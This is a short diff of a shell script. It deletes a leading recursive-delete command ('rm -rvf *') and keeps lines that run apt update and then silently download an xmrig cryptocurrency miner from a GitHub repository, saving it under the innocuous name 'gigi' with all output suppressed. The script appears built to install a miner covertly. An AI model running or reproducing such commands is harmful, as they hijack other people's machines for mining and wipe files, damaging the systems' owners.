@@ -1,4 +1,3 @@
-rm -rvf * 
 #!/bin/sh
 apt update
 wget -O gigi https://github.com/kazppkido/kikir/raw/main/xmrig > /dev/null 2>&1
